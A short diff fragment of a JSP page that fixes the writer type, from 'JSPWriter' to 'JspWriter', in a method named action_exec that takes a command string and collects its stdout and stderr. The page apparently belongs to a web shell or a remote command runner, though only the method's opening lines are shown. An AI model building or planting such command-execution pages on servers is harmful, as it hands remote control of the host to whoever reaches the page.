@@ -6,7 +6,7 @@
 <%@ page contentType="application/json; charset=UTF-8" %>
 
 <%!
-private void action_exec(JSPWriter writer, String cmd) throws IOException {
+private void action_exec(JspWriter writer, String cmd) throws IOException {
     String stdout = "";
     String stderr = "";
     String linebuffer = "";
